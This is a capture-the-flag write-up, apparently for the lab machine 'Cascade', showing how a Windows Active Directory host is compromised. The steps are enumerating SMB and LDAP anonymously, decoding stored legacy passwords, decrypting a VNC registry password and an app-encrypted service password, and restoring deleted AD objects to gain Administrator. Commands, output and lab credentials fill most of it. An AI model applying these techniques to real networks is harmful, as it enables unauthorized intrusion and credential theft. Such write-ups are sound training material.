# Cascade

## Gaining Access&#x20;

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.178.248
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 08:23 EDT
Nmap scan report for 10.129.178.248
Host is up (0.0083s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

### SMB Null Shares

SMB enumeration gave me a load of usernames.&#x20;

```
$ enum4linux -u '' -p '' -a 10.129.178.248
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

ASREP-Roasting doesn't work, and brute forcing didn't work. In this case, we can take a look at LDAP and its output.

### LDAP Enum

We can run an anonymous `ldapsearch` on the machine, and find loads of output. While looking through the users' LDAP information, I came across this

```
$ ldapsearch -x -H ldap://10.129.178.248 -D '' -w '' -b "DC=cascade,DC=local" > ldap_enum
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

There was a `cascadceLegacyPwd` field, which is normally not present. Decoded, this gives `rY4n5eva`. Using these credentials, we can gain access to the SMB shares, but no shell yet.&#x20;

```
$ smbmap -H 10.129.178.248 -u r.thompson -p rY4n5eva                          
[+] IP: 10.129.178.248:445      Name: 10.129.178.248                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

### SMB Shares

We can enumerate the files within the SMB shares, and hopefully find some credentials. I downloaded all the files within the Data share.

```
$ smbclient -U r.thompson //10.129.178.248/Data
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (74.6 KiloBytes/sec) (average 74.6 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (29.6 KiloBytes/sec) (average 49.1 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (153.3 KiloBytes/sec) (average 83.9 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (81.8 KiloBytes/sec) (average 83.4 KiloBytes/sec)
```

The Printer share had a bunch of DLLs and other printer-related files like images, which was not interesting. Out of all files downloaded, the VNC Install one was the most interesting. VNC is sort of like RDP, so there might be credentials there.&#x20;

```
$ cat VNC\ Install.reg   
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Sure enough, we can find a password there. However, VNC passwords are encrypted, and they can be decoded by following the instructions on this repository:

{% embed url="https://github.com/frizb/PasswordDecrypts" %}

<figure><img src="../../../.gitbook/assets/image (3623).png" alt=""><figcaption></figcaption></figure>

With these credentials, we can login as `s.smith`.

<figure><img src="../../../.gitbook/assets/image (3974).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### CascAudit.exe -> ArkSvc Creds

We can first enumerate what groups this user is part of:

```
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Audit Share is rather interesting. We can take another look at the SMB shares I have available to `s.smith`.&#x20;

```
$ smbmap -H 10.129.178.248 -u s.smith -p sT333ve2   
[+] IP: 10.129.178.248:445      Name: 10.129.178.248                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

There's a new share called `Audit$` available. Within it, there were some files, including a DB file.

```
$ smbclient -U s.smith //10.129.178.248/Audit$   
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1627021 blocks available
smb: \> cd DB
smb: \DB\> ls
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
```

`Audit.db` was an SQLite database file, which we can open using `sqlite3`.&#x20;

```
$ sqlite3 -readonly Audit.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc
sqlite> SELECT * FROM ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

We have another password, and this wasn't base64 encoded. In this case, let's take another look at the `.exe` file and open it within DnSpy on my Windows VM. When we decompile the main function, this is what we see:

```csharp
public static void Main()
		{
			if (MyProject.Application.CommandLineArgs.Count != 1)
			{
				Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
				return;
			}
			checked
			{
				using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
				{
					string str = string.Empty;
					string password = string.Empty;
					string str2 = string.Empty;
					try
					{
						sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
						{
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								sqliteDataReader.Read();
								str = Conversions.ToString(sqliteDataReader["Uname"]);
								str2 = Conversions.ToString(sqliteDataReader["Domain"]);
								string text = Conversions.ToString(sqliteDataReader["Pwd"]);
								try
								{
									password = Crypto.DecryptString(text, "c4scadek3y654321");
								}
								catch (Exception ex)
								{
									Console.WriteLine("Error decrypting password: " + ex.Message);
									return;
								}
							}
```

There was some type of password encrypting, and it uses `c4scadek3y654321` to do so. It also uses the database that is present as an argument. In this case, I ran it within my machine after setting a breakpoint at the **password** line after passing the absolute directory of the `Audit.db` file as one argument.

When we view the local variables, we find a password:

<figure><img src="../../../.gitbook/assets/image (3333).png" alt=""><figcaption></figcaption></figure>

With this, we can login as the `ArkSvc` user.

<figure><img src="../../../.gitbook/assets/image (1686).png" alt=""><figcaption></figcaption></figure>

### Recycle Bin

This user is part of the Recycle Bin group:

```
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

This means we can restore and view deleted items. We can run this one-liner:

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Within the output, we would see another `CascadeLegacyPw` field.&#x20;

```
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

This decodes to give `baCT3r1aN00dles`, and I noticed this was for a user called `TempAdmin`. By testing password reuse, we find that we can login as the Administrator using this password.&#x20;

<figure><img src="../../../.gitbook/assets/image (3687).png" alt=""><figcaption></figcaption></figure>

Rooted!
